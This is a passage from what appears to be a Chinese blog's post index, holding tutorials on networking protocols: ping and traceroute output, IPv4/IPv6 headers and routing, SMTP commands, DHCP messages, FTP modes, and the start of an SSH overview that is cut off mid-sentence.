例如，在Windows命名提示符窗口键入 ping www.baidu.com 用来测试本机和百度服务器的连通性测试结果。 123456789101112C:\\Users\\HR&gt;ping www.baidu.com正在 Ping www.a.shifen.com [182.61.200.6] 具有 32 字节的数据:来自 182.61.200.6 的回复: 字节&#x3D;32 时间&#x3D;26ms TTL&#x3D;47来自 182.61.200.6 的回复: 字节&#x3D;32 时间&#x3D;26ms TTL&#x3D;47来自 182.61.200.6 的回复: 字节&#x3D;32 时间&#x3D;27ms TTL&#x3D;47来自 182.61.200.6 的回复: 字节&#x3D;32 时间&#x3D;26ms TTL&#x3D;47182.61.200.6 的 Ping 统计信息: 数据包: 已发送 &#x3D; 4，已接收 &#x3D; 4，丢失 &#x3D; 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位): 最短 &#x3D; 26ms，最长 &#x3D; 27ms，平均 &#x3D; 26ms (2) Traceroute Traceroute是跟踪一个分组从源点到终点的路径，使用了ICMP时间超过差错报告报文。 Traceroute工作原理： 源主机会发送多组生存时间TTL连续的IP数据报，每组3个，数据报中封装的是无法交付的UDP数据报。 (1) 第一组的数据报的生存时间TTL = 1，当这组数据报到达路径上的第一个路由器时，路由器收下后，接着把TTL值减1，由于TTL = 0，所以路由器丢弃该报文，并向源主机发送一个ICMP时间超过差错报告报文。 (2) 源主机接着会发送第二组IP数据报，并把TTL 的值设为2，当数据报到达第二个路由器时被丢弃并向源主机返回一个ICMP时间超过差错报告报文。 … (3) 当最后一组数据刚刚到达目的主机时，TTL = 1，主机不转发数据报，也不把TTL的值减1，但是因IP数据报封装的是无法交付的运输层UDP用户数据报，因此目的主机要向源主机发送ICMP终点不可达差错报告报文。 这样源主机就达到了自己的目的，因为这些路由器和最后的目的主机发来的ICMP报文正好给出了主机到目的主机的路由信息——到达目的主机所要经过的路由器的IP地址，以及每个路由器的往返时间。 下图表示本机到新浪网的邮件服务器的发送的tracert命令所获得的结果。每组三个IP数据报，所以有3个往返时间，其中第一行的IP地址是主机的默认网关。 123456789101112131415161718192021222324C:\\Users\\HR&gt;tracert mail.sina.com.cn通过最多 30 个跃点跟踪到 common7.dpool.sina.com.cn [123.126.45.14] 的路由: 1 &lt;1 毫秒 &lt;1 毫秒 &lt;1 毫秒 114.213.244.1 2 &lt;1 毫秒 &lt;1 毫秒 3 ms 192.168.1.5 3 &lt;1 毫秒 &lt;1 毫秒 1 ms 172.16.200.2 4 1 ms 1 ms 1 ms 210.45.231.252 5 1 ms 1 ms 1 ms 101.4.115.13 6 1 ms 1 ms 1 ms 101.4.115.185 7 8 ms 7 ms 7 ms 101.4.112.61 8 27 ms 27 ms 27 ms 101.4.117.38 9 25 ms 25 ms 41 ms 101.4.112.1 10 25 ms 25 ms 25 ms 101.4.113.109 11 30 ms 26 ms 27 ms 101.4.116.14 12 29 ms 27 ms 27 ms 219.158.34.57 13 31 ms 31 ms 31 ms 219.158.5.129 14 * 27 ms * 124.65.194.98 15 * * * 请求超时。 16 27 ms 27 ms 27 ms 61.49.43.78 17 26 ms 27 ms 26 ms 123.126.45.14跟踪完成。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"IP协议","slug":"IP协议","date":"2020-01-15T05:31:09.000Z","updated":"2020-02-25T14:20:26.119Z","comments":true,"path":"2020/01/15/IP协议/","link":"","permalink":"http://yoursite.com/2020/01/15/IP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"IP协议是TCP/IP协议族的核心协议，其主要包含两个方面： IP头部信息。IP头部信息出现在每个IP数据报中，用于指定IP通信的源端IP地址、目的端IP地址，指导IP分片和重组，以及指定部分通信行为。 IP数据报的路由和转发。IP数据报的路由和转发发生在除目标机器之外的所有主机和路由器上。它们决定数据报是否应该转发以及如何转发。一、IP服务的特点 IP协议是TCP/IP协议族的动力，它为上层协议提供无状态、无连接、不可靠的服务。 无状态是指IP通信双方不同步传输数据的状态信息，因此所有IP数据报的发送、传输和接收都是相互独立、没有上下文关系的。这种服务最大的缺点就是无法处理乱序和重复的IP数据报。面向连接的协议，比如TCP协议，能够自己处理乱序的、重复的报文段，它递交给上层协议的内容绝对是有序的、正确的。无状态服务的优点也很明显：简单、高效。我们无需为保持通信的状态而分配一些内核资源，也无需每次传输数据时都携带状态信息。 无连接是指IP通信双方都不长久地维持对方的任何信息。这样上层协议每次发送数据的时候，都必须明确指定对方的IP地址。 不可靠是指IP协议不能保证IP数据报准确地到达接收端，它只是承诺尽最大努力。很多情况都可以导致IP数据报发送失败。比如，某个中转路由器发现IP数据报在网络上存活地时间太长，那么它将丢弃该报文，并返回一个ICMP错误消息给发送端。因此，使用IP服务地上层协议需要自己实现数据确认、超时重传等机制以达到可靠传输的目的。二、IPv4头部结构 IPv4的头部结构如下所示，其长度通常为20个字节，除非含有可变长的选项部分。 4位版本号指定IP协议的版本。对于IPv4来说，其值是4.其他IPv4的扩展版本（如SIP协议和PIP协议），则具有不同的版本号。4位头部长度标识该IP头部有多少个32bit字（4字节）。因为4位最大能表示15，所以IP头部最长是60字节。8位服务类型包括一个3位的优先权字段，4位的TOS字段和1位的保留字段（必须置0）。4位的TOS字段分别表示：最小延时，最大吞吐量，最高可靠性和最小费用。其中最多有一个能置位1，应用程序应该根据实际需要来设置它。比如像ssh和telnet这样的登陆程序需要的是最小延时服务，而文件传输程序ftp则需要最大吞吐量的服务。16位总长度是指整个IP数据报的长度，以字节为单位，因此IP数据报的最大长度为65535字节。但由于MTU的限制，长度超过MTU的数据报都将被分片传输，所以实际传输的IP数据报的长度都远远没有达到最大值。16位标识唯一地标识主机发送地每一个数据报。其初始值由系统随机生成，没发送一个数据报，其值就加1.该值在数据报分片时被复制到每个分片中，因此同一个数据报地所有分片都具有相同地标识。3位标志字段地第一位保留。第二位表示”禁止分片”。如果设置了这个位，IP模块将不对数据报进行分片。在这种情况下，如果IP数据报长度超过MTU的话，IP模块将丢弃该数据报并返回一个ICMP差错报文。第三位表示“更多分片”。除了数据报的最后一个分片外，其他分片都要把它置1。13位分片偏移是分片相对原始IP数据报开始处(仅指数据部分)的偏移。实际的偏移值是该值左移3位（乘8）后得到的。由于这个原因，除了最后一个IP分片外，每个IP分片的数据部分的长度必须是8的整数倍(这样才能保证后面的IP分片拥有一个合适的偏移量)。8位生存时间(TTL)是数据报到达目的地之前允许经过的路由器跳数。TTL值被发送端设置(常见值位64)。数据报在转发过程中每经过一个路由，该值就被路由器减1。当TTL值减为0时，路由器将丢弃数据报，并向源端发送一个ICMP差错报文。TTL值可以防止数据报陷入路由循环。8位协议用来区分上层协议，/etc/protocols文件定义了所有上层协议对应的protocol字段的数值。其中ICMP是1，TCP是6，UDP是17。16位头部校验和由发送端填充，接收端对其使用CRC算法以检验IP数据报头部在传输过程中是否损坏。32位的源端IP地址和目的端IP地址用来标识数据报的发送端和接收端。一般情况下，这两个地址在整个数据报的传递过程中保持不变，而不论它中间经过多少个中转路由器。IPv4最后一个选项字段是可变长的可选信息。这部分最多包含40个字节，因为IP头部最长是60字节（其中还包含前面讨论的20字节的固定部分）。可用的IP选项包括： ​ 1、记录路由，告诉数据报途径的所有路由器都将自己的IP地址填入IP头部的选项部分，这样就可以跟踪数据报的传递路径。 ​ 2、时间戳，告诉每个路由器都将数据报被转发的时间填入IP头部的选项部分，这样就可以测量途径路由之间数据报传输时间。 ​ 3、松散源路由选择，指定一个路由器IP地址列表，数据报发送过程必须经过其中所有的路由器。 ​ 4、严格源路由选择，和松散源路由选择类似，不过数据报只能经过被指定的路由器。 三、IP分片 前文提到过，当IP数据报的长度超过帧的MTU时，它将被分片传输。分片可能发生在发送端，也可能发生在中转路由器上，而且可能在传输过程中多次分片，但只有在最终的目标机器上，这些分片才会被内核中的IP模块重新组装。 IP头部中的如下三个字段给IP的分片和重组提供了足够的信息：数据报标识、标志和片偏移。一个IP数据报的每个分片都具有自己的IP头部，它们具有相同的标识值，但具有不同的片偏移。并且除了最后一个分片外，其他分片都将设置MF标志。此外，每个分片的IP头部的总长度字段将被设置位该分片的长度。 以太网帧的MTU时1500字节，因此它携带的IP数据报的数据部分最多是1480字节（IP头部占用20字节）。考虑用IP数据报封装一个长度为1481字节的ICMP报文（包括8字节的ICMP头部，所以其数据部分长度为1473字节），则该数据报在使用以太网帧传输时必须被分片，如下： · 上图中，长度为1501字节的IP数据被拆分成两个IP分片，第一个IP分片长度为1500字节，第二个IP分片的长度为21个字节。每个IP分片都包含自己的IP头部（20字节），且第一个IP分片的IP头部设置了MF标志，而第二个IP分片的IP头部则没有设置该标志，因为它已经是最后一个分片了。原始IP数据报中的ICMP头部内容被完整地复制到了第一个IP分片中。第二个IP分片不包含ICMP头部信息，因为IP模块重组该ICMP报文地时候只需要一份ICMP头部信息，重复传送这个信息没有任何益处。1473字节地ICMP报文数据的前1472字节被IP模块复制到第一个IP分片中，使其总长度为1500字节，从而满足MTU的要求；而多出最后1字节则被复制到第二个IP分片中。 需要指出的是，ICMP报文的头部长度取决于报文的类型，其变化范围很大，上图以8字节为例。 四、IP路由 IP协议的一个核心任务是数据报的路由，即决定发送数据报到目标机器的路径。 1、IP模块工作流程 从右往左分析上图，当IP模块接收到来自数据链路层的IP数据报是，它首先对该数据报的头部做CRC校验，确认无误之后就分析其头部的具体信息。 如果该IP数据报的头部设置了源站选路选项（松散源路由选择或严格源路由选择），则IP模块调用数据报转发子模块来处理该数据报。如果该IP数据报的头部中目标IP地址是本机的某个IP地址，或者是广播地址，即该数据是发送给本机的，则IP模块就根据数据报头部中的协议字段来决定将它派发给哪个上层应用。如果IP模块发现这个数据报不是发送给本机的，则也调用数据报转发子模块来处理该数据报。 数据报转发子模块将首先检测系统是否允许转发，如果不允许，IP模块就将数据报丢弃。如果允许，数据报转发子模块将对该数据报执行一些操作，然后将它交给IP数据报输出子模块。 IP数据报应该发送至哪个下一跳路由（或者目标主机），以及经过哪个网卡来发送，就是IP路由过程，即图中“计算下一跳路由”子模块。IP模块实现数据报路由的核心数据结构是路由表。这个表按照数据报的目标IP地址分类，同一类型的IP数据报将被发往相同的下一跳路由器（或者目标主机）。 IP输出队列中存放的是所有等待发送的IP数据报，其中除了需要转发的IP数据报外，还包括封装了本机上层数据（ICMP报文、TCP报文和UDP数据报）的IP数据报。 图中的虚线箭头显示了路由表更新的过程。这一过程是指通过路由协议 或者route命令调整路由表，使之更适应最新的网络拓扑结构，成为IP路由策略。 2、路由机制 首先，我们熟悉以下路由表的内容： 路由器是如何按照IP地址分类的呢？或者说给定数据报的目标IP地址，它将匹配路由表中的哪一项呢？这就是IP的路由机制，分为3个步骤： 查找路由表中的数据报的目标IP地址完全匹配的主机IP地址。如果找到，就是用该路由项，没找到则转步骤2.查找路由表中的数据报目标IP地址具有相同网络ID的网络IP地址。如果找到，就使用该路由项；没找到则转步骤3.选择默认路由项，这通常意味着数据报的下一跳路由是网关。 五、IP转发 前文提到，不是发送给本机的IP数据报将由数据报转发子模块来处理。路由器都能执行数据报的转发操作，而主机一般只能发送和接受数据报，这是因为主机上/proc/sys/net/ipv4/ip_forward内核参数默认被设置为0.我们可以通过修改它来实现主机的数据报转发功能。 对于允许IP数据报转发的系统，数据报转发子模块将对期望转发的数据报执行如下操作： 检查数据报头部的TTL值。如果TTL值已是0，则丢弃该数据报。查看数据报头部的严格源路由选择选项。如果该选项被设置，则检查数据报的目标IP地址是否是本机的某个IP地址。如果不是，则发送一个ICMP源站选路失败报文给发送端。如果有必要，则给源端发送一个ICMP重定向报文，以告诉它一个更合理的下一跳路由器。将TTL值减1处理IP头部选项。如果有必要，则执行IP分片操作。 六、ICMP重定向报文 ICMP重定向报文也能用于更新路由表。 1、ICMP重定向报文 前边讨论过ICMP报文头部的3个固定字段：8位类型、8位代码和16位校验和。ICMP重定向报文的类型值是5，代码字段有4个可选值，用来区分不同的重定向类型。以下介绍主机重定向，其代码值是1. ICMP重定向报文的数据部分含义很明确，它给接收方提供了如下两个信息： 引起重定向的IP数据报的源端IP地址。应该使用的路由器的IP地址。 接受主机根据这两个信息就可以断定引起重定向的IP数据报应该使用哪个路由器来转发，并且以此来更新路由表（通常是更新路由表缓冲，而不是直接更改路由表）。 /proc/sys/net/ipv4/conf/all/send_redirects内核参数指定是否允许发送ICMP重定向报文，而/proc/sys/net/ipv4/conf/all/accept_redirects内核参数则指定是否允许接收ICMP重定向报文。一般来说，主机只能接收ICMP重定向报文，而路由器只能发送ICMP重定向报文。七、IPv6头部结构 IPv6协议是网络层技术发展的必然趋势。它不仅解决了IPv4地址不够用的问题，还做了很大的改进。比如，增加了多播和流的功能，为网络上多媒体内容的质量提供精细的控制；引入自动配置功能，使得局域网管理更方便；增加了专门的网络安全功能等。 1、IPv6固定头部结构 IPv6头部由40字节的固定头部和可变长的扩展头部组成。如下： 4位版本号指定IP协议的版本。对IPv6来说，其值是68位通信类型指示数据流通信类型或优先级，和IPv4中的TOS类似20位流标签是IPv6新增加的字段，用于某些对连接的服务质量有特殊要求的通信，比如音频或视频等实时传输的数据传输16位净荷长度指的是IPv6扩展头部和应用程序长度之和，不包括固定头部长度。8位下一个包头指出紧跟IPv6固定头部后的包头类型，如扩展头或某个上层协议头。它类似于IPv4头部中的协议字段，且相同的取值有相同的含义。8位跳数限制和IPv4中的TTL含义相同IPv6用128来表示IP地址，使得IP地址的总量达到了2的128次方，足够使用。32位表示的IPv4地址一般用点分十进制来表示，而IPv6地址则使用十六进制字符串表示，比如“FE80:0000:0000:0000:1234:5678:0000:0012”可见，IPv6地址用“：”分割成8组，每组包含2字节。但这种方法过于麻烦，通常可以使用所谓的零压缩法来将其简写，也就是省略连续的、全零的组，比如“FE80::1234:5678:0000:0012”。不过零压缩法对一个IPv6地址只能使用一次，比如上面的例子中，字节组“5678”后面的全零组就不能再省略，否则我们就无法计算每个“：：”之间省略了多少个全零组。 2、IPv6扩展头部 可变长的扩展头部使得IPv6能支持更多的选项，并且很便于将来的扩展需要。它的长度可以是0，表示数据报没有使用任何扩展头部。一个数据报可以包含多个扩展头部，每个扩展头部的类型由前一个头部中的下一个报头字段指定。目前可以使用的扩展头部如下：","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"SMTP协议","slug":"SMTP协议","date":"2020-01-13T15:29:57.000Z","updated":"2020-02-25T14:13:34.966Z","comments":true,"path":"2020/01/13/SMTP协议/","link":"","permalink":"http://yoursite.com/2020/01/13/SMTP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"SMTP模型参看RFC5321，可以了解到SMTP的模型如下： 常用指令 SMTP中包含一些基本的命令用于客户端和服务器端进行交互，现列出一些常见的指令： 指令 说明 HELO 与服务器确认，通知其客户端使用的机器名称，一般邮件服务器不做限定 AUTH 使用AUTH LOGIN与服务器进行登录验证 MAIL FROM 发件人信息，填写与认证信息不同往往被定位为垃圾邮件或恶意邮件 RCPT TO 收信人地址 DATA 输入邮件基本信息 FROM 邮件基本信息：发信人显示信息（此处可以伪造身份，但是非常容易被识别） FROM 邮件基本信息：服务器收件人显示信息 SUBJECT 邮件基本信息：邮件标题，不填写也往往容易被定位为垃圾邮件 QUIT 断开链接 常见指令返回码说明 返回码 说明 220 服务就绪 250 请求动作成功完成 235 认证通过 221 处理中 354 发送开始，往往与data指令结合 500 指令错误 550 命令无法执行 基本流程SMTP客户端与SMTP服务器端一个常见的流程如下所示：","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"DHCP协议","slug":"DHCP协议","date":"2020-01-12T15:29:23.000Z","updated":"2020-02-25T14:01:13.600Z","comments":true,"path":"2020/01/12/DHCP协议/","link":"","permalink":"http://yoursite.com/2020/01/12/DHCP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"DHCP: 动态主机配置协议 TCP/IP协议想要运行正常的话，网络中的主机和路由器不可避免地需要配置一些信息（如接口的IP地址等）。有了这些配置信息主机/路由器才能提供/使用特定的网络服务。 主机信息的必要元素有：IP地址、子网掩码、DNS服务器IP地址 TCP/IP协议配置主机信息主要有三种方法：\\1. 手动配置\\2. 动态获取\\3. 根据特定算法计算。 在网络中，我们把主机分为两大类，服务器主机和客户端主机，+ 服务器主机： 一般采用手动配置+ 客户端主机： 一般采用动态获取 服务器一般采用手动配置，而客户端一般动态获取。主要基于以下原因：\\1. 客户主机比服务主机移动更频繁\\2. 服务主机需要提供更可靠的服务，其配置信息应该减少对其他系统/主机的依赖\\3. 客户主机比服务主机的数量要多得多。\\4. 客户主机使用者的网络配置知识比服务主机的使用者低 DHCP有Bootp协议发展而来。Bootp协议提供了有限的主机信息配置，且主机信息已经配置就很难被修改。DHCP提供 几乎所有的主机信息的配置，且引入了租约等概念，使得主机信息能够动态发生变化。 DHCP向后兼容Bootp。 DHCP基于UDP/IP传输。DHCP服务器使用端口号67，DHCP 客户端使用端口号68. DHCP 协议内容DHCP 主要分为两部分： 地址的管理 和 配置信息的传递+ 地址管理： 地址管理处理IP‘地址的动态分配、向客户端提供地址租约+ 配置信息的传递： 包含DHCP报文格式、状态机 DHCP 地址管理地址池 与 地址租约 在IP地址的动态分配中，DHCP客户端想DHCP服务器发送IP地址请求。DHCP服务器会维护一个 IP地址池，DHCP从地址池从取出一个IP回应给DHCP客户端。在地址分配时，DHCP服务器也会指定回应给DHCP客户端的IP地址的租约期，该地址只有在该租约期内可用，不过DHCP客户端可用在租约期内请求延长租约（更新租约期）。 DHCP 报文Op： 报文类型，分为 两大类： Request（1） 和 Reply（2）HW Type： 硬件类型，一般是以太网：1HW Len： 硬件地址长度，单位字节。对应以太网：6（mac地址长度为6字节48bit）Transaction ID：事务ID，随机数，有客户端生成，服务器Reply时，会把Request中的Transaction拷贝到Reply报文中。Secs： 距离第一次发射IP请求或Renew请求过去的秒数Flags：标志位，目前仅第一个bit有使用，置1 标明广播Client IP Address：当前客户端的IP地址，如果当前客户端没有IP地址，则置0Your IP Address： 服务器想客户端提供IP地址时，会把IP地址填入本字段（Next）Server IP Address：客户端引导时需要的另一个服务器的IP地址Gateway （Relay） IP Address： 网关（中继）IP地址，有DHCP 中继器在转发DHCP报文的时候填入Server Name： Server名字，有64bytes，一般不使用，填充为0Boot File name： boot file的路径，128bytes， 一般不使用，填充为0Option： 选项，不定长度。 DHCP报文中比较重要的字段，后面会有比较详细的介绍。 DHCP Option DHCP从Bootp拓展而来，DHCP报文也是有Bootp报文发展而来。但是DHCP在Bootp之上添加了许多功能，其报文也需要有一定的拓展。如果Bootp报文不能满足的内容，就以Option的形式存在于DHCP报文中。 DHCP协议其实就是携带许多Option的Bootp DHCP有许多类型的Option，长度不一（但都是整数字节）。Option遵循以下格式+ 如果Option没有值，则只有标志位之类的内容，则以一个字节表示+ 如果Opiton有值，即Opiton是以下name-value对，则Opiton需要多个字节表示，其中第一个字节表示 option的名字，第二字节表示value的长度，第三个字节开始表示value。 DHCP支持大量的Option（Bootp也支持其中的部分），下面列举一些常用的 Option 名称 描述 0 Pad 填充位 1 Subnet Mask 子网 掩码 3 Router Address 路由器地址 6 DNS DNS server 15 DN 域名 50 Requested IP Address 请求的IP地址 51 Address Lease Time 地址租约时间 53 DHCP Message Type DHCP 消息类型，如Discover、Request、Offer、ACK等 54 Server Identifier 服务器标识 55 Parameter Request List 参数请求列表 56 DHCP Error Message DHCP 错误消息 58 Lease Renewal Time 租约续期时间 59 Lease Rebinding Time 租约重新设定的时间 61 Client Identifier 客户标识 119 Domain Search List 域名查找列表 255 End 结束 上面是常用的Option，DHCP报文与Option 255标识报文的结束。在DHCP Option中，我们着重看下DHCP Message Type（53），DHCP Message Type标识DHCP消息类型，主要有一下类型 DHCP 消息类型 对应的Option值 DHCPDISCOVER 1 DHCPOFFER 2 DHCPREQUEST 3 DHCPDECLINE 4 DHCPACK 5 DHCPNAK 6 DHCPRELEASE 7 DHCPINFORM 8 DHCPFORCERENEW 9 DHCPLEASEQUERY 10 DHCPLEASEUNASSIGNED 11 DHCPLEASEUNKNOWN 12 DHCPLEASEACTIVE 13 DHCP 协议 操作流程主机新加入网络时，获取IP的流程\\1. 新的client加入网络时，会使用0.0.0.0作为源地址，发送discover广播报文，查询网络上有哪些DHCP server，以及这些DHCP server 能Offer哪些IP地址\\2. DHCP服务器接收到DHCP Discover报文后，回应Offer报文，提供IP地址（可能包含DNS等其他信息）给client\\3. client 根据收到的Offer报文，选择一个DHCP server，并选择它提供的IP地址。然后广播Request报文，想DHCP Server请求该IP地址，同时想本地网络（尤其是其他DHCP Server）公告自己已经选择了某个DHCP Server的某个IP地址。\\4. DHCP Server 回应ACK报文，将IP地址分配给Client端 （特殊情况：DHCP Server在发送Offer报文和接收到Request的短暂时间内把IP分配给了其他主机）\\5. DHCP Client 收到ACK报文后，会针对获得的IP地址发送ARP Request，进行IP地址冲突检测。\\6. 如果IP地址已经被其他主机使用，则Client放弃该IP地址，想Server发送DHCP DECLINE报文告诉Server该地址不能使用。然后一段时间后（一般10s）再此尝试获取该IP地址\\7. 如果Client仍然无法使用该IP地址，则发送DHCP RELEASE报文，放弃该地址。 主机已经有IP地址，只想更新租约\\1. 此时可以跳过DHCP Discover报文和DHCP Offer报文\\2. Client发送携带当前IP地址的Request报文\\3. 如果Server同意Client续约，则发送DHCP ACK报文。如果拒绝续约，则发送DHCPNAK报文。 ** 主机只想更新IP地址以外的信息**用DHCPINFORM 取代 DHCP Request报文。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"FTP协议","slug":"FTP协议","date":"2020-01-11T15:28:33.000Z","updated":"2020-02-25T13:57:59.758Z","comments":true,"path":"2020/01/11/FTP协议/","link":"","permalink":"http://yoursite.com/2020/01/11/FTP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"简介FTP(File Transfer Protocol)是应用层的一个文件传输协议。其主要作用是在服务器和客户端之间实现文件的传输和共享。FTP协议运行在TCP连接上，保证了文件传输的可靠性（运行在UDP协议上的是TFTP协议） 与Http协议区别Http和FTP都是文件传输协议，都是运行在tcp上面，但是他们也有一些重要的区别，FTP使用了两个并行的tcp来传输文件：一个是控制连接（port:21），一个是数据连接(port:20)，控制连接用于在两个主机之间传输控制信息，如口令，用户标识，存放、获取文件等命令。数据连接用于实际发送一个文件,发送完文件之后数据连接后会关闭。因为ftp协议使用一个独立的控制连接，所以，也称ftp的控制信息是带外（out-of-band）传送的。而Http协议是在传输文件的同一个tcp连接中发送请求和相应首部行的。因此，Http也可以说是带内（in-band）发送控制信息。 FTP的两种传输方式FTP支持两种方式的传输：文本（ASCII）方式和二进制（Binary）方式。通常文本文件的传输采用ASCII方式，而图象、声音文件、加密和压缩文件等非文本文件采用二进制方式传输，如果为了从一个系统上传输文件而使用了与本地系统不同的计算机字节位数，那么就必须使用Tenex模式。FTP以ASCII方式作为默认的文件传输方式。 FTP的两种传输模式FTP有两种传输模式：主动（FTP Port）模式和被动（FTP Passive）模式。由于主动模式存在着安全问题，最近几年，大部分的TFP客户端开始默认使用被动模式。 主动模式（Port）主动模式的核心是TFP客户端告诉服务端自己开发那个端口作为数据端口，然后让服务端来连接自己。 主动模式的连接建立一般是通过一些几个步骤： 客户端随机打开一个本地大于1024的端口P1 客户端通过端口P1向服务器控制端口（端口21）发起连接请求 服务器进行认证成功，请求建立 客户端对本地端口P2进行监听并向服务器发送“Port P1+1”告诉服务器，客户端的数据监听端口。 服务器收到端口后，从自己的数据端口（端口20）发起连接，连接到客户端指定的数据端口P1+1. 被动方式（Passive）由于主动方式中，服务端需要主动连客户端，对于客户端的防火墙来说，属于外部连接内部，会出现被阻塞的情况。被动方式解决了这个问题。被动连接的核心是控制连接请求和数据连接请求都是由客户端发起。被动方式的步骤如下： 客户端任意打开大约1024的两个本地端口（P1和P1+1） P1端口发送请求连接服务器的21端口（控制连接端口）同时提交PASV命令。 服务器收到请求后，会开启任意一个大约1024的端口P2，然后返回如下格式内容： 227 entering passive mode(h1,h2,h3,h4,p1,p2) 客户端收到服务端返回的内容后，计算出服务端开放的数据连接端口 客户端通过P1+1端口向服务端的发送连接请求。进行数据传输。 关于服务端返回的报文格式(h1,h2,h3,h4,p1,p2)具体含义如下： h1,h2,h3,h4代表服务器的ip地址； p1,p2代表服务器监听的数据连接端口地址。计算方法为P1*256+P2 FTP的限制对于FTP服务器来讲，他必须在整个会话期间保持用户的状态（state），特别是，服务器必须把特定的用户账户与控制联系起来，用户在远程目录树上不断跳转时，服务器必须追踪到用户在远程树上的当前位置，换句话说，当客户端用户数量不断增多，FTP服务器所要维持的会话总数,也会迅速增长。着会大大限制FTP服务器的性能。 FTP中的命令与应答命令FTP协议的命令是认可读的，每个命令由4个大写的ASCII字符组成，有些还可带一些可选参数，命令后面跟回车符换行。 一下问几个常用的命令： 命令 解释 USER username 用于向服务器传输用户标识 PASS password 用于向服务器发送用户口令 LIST 请求服务器所有文件列表，文件列表是在（新建且非持续连接）数据连接上传递 RETR filename 用于从远程主机当前目录检索（get）文件。该命令引起远程主机发起一个数据连接，并经数据连接发送所请求的文件。 STOR filename 用于在远程主机的当前目录上存放（put）文件 应答FTP客户端每个发出的命令都会对应一个FTP服务器发出的应答。应带是一个3为的数字，后跟一个可选信息。他与http响应报文的状态码和状态信息的结构相同，比较常见的几个应带可以参考如下： 应答 解释 331 Username OK, Password required 用户名OK,请输入密码 125 Data connection already open;transfer starting 数据连接已经打开，开始传送 425 Can’t open data connection 无法打开数据连接 452 Error writing file 文件写入出错 以上的FTP命令和应答比较简单，如果想详细了解相关的命令和应答，可以查阅RFC959 相关文档","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"SSH协议","slug":"SSH协议","date":"2020-01-09T15:26:16.000Z","updated":"2020-02-25T13:55:41.676Z","comments":true,"path":"2020/01/09/SSH协议/","link":"","permalink":"http://yoursite.com/2020/01/09/SSH%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"一、什么是SSH SSH是英文Secure Shell的简写形式。通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、Pop、甚至为PPP提供一个安全的”通道”。 二、SSH 基本框架 SSH协议框架中最主要的部分是三个协议： * 传输层协议（The Transport Layer Protocol）提供服务器认证，数据机密性，信息完整性 等的支持； * 用户认证协议（The User Authentication Protocol） 则为服务器提供客户端的身份鉴别； * 连接协议（The Connection Protocol） 将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。 同时SSH协议框架中还为许多高层的网络安全应用协议提供扩展的支持。它们之间的层次关系可以用如下图来表示： 三、主机密钥机制 对于SSH这样以提供安全通讯为目标的协议，其中必不可少的就是一套完备的密钥机制。由于SSH协议是面向互联网网络中主机之间的互访与信息交换，所以主机密钥成为基本的密钥机制。也就是说，SSH协议要求每一个使用本协议的主机都必须至少有一个自己的主机密钥对，服务方通过对客户方主机密钥的认证之后，才能允许其连接请求。一个主机可以使用多个密钥，针对不同的密钥算法而拥有不同的密钥，但是至少有一种是必备的，即通过 DSS算法产生的密钥。关于DSS算法，请参考[FIPS-186]。 SSH协议关于主机密钥认证的管理方案有两种，如下图所示： 每一个主机都必须有自己的主机密钥，密钥可以有多对，每一对主机密钥对包括公开密钥和私有密钥。在实际应用过程中怎样使用这些密钥，并依赖它们来实现安全特性呢？如上图所示，SSH协议框架中提出了两种方案。 在第一种方案中，主机将自己的公用密钥分发给相关的客户机，客户机在访问主机时则使用该主机的公开密钥来加密数据，主机则使用自己的私有密钥来解密数据，从而实现主机密钥认证，确定客户机的可靠身份。在图2（a）中可以看到，用户从主机A上发起操作，去访问，主机B和主机C，此时，A成为客户机，它必须事先配置主机B和主机C的公开密钥，在访问的时候根据主机名来查找相应的公开密钥。对于被访问主机（也就是服务器端）来说则只要保证安全地存储自己的私有密钥就可以了。 在 第二种方案中，存在一个密钥认证中心，所有系统中提供服务的主机都将自己的公开密钥提交给认证中心，而任何作为客户机的主机则只要保存一份认证中心的公开 密钥就可以了。在这种模式下，客户机在访问服务器主机之前，还必须向密钥认证中心请求认证，认证之后才能够正确地连接到目的主机上。 很 显然，第一种方式比较容易实现，但是客户机关于密钥的维护却是个麻烦事，因为每次变更都必须在客户机上有所体现；第二种方式比较完美地解决管理维护问题， 然而这样的模式对认证中心的要求很高，在互联网络上要实现这样的集中认证，单单是权威机构的确定就是个大麻烦，有谁能够什么都能说了算呢？但是从长远的发 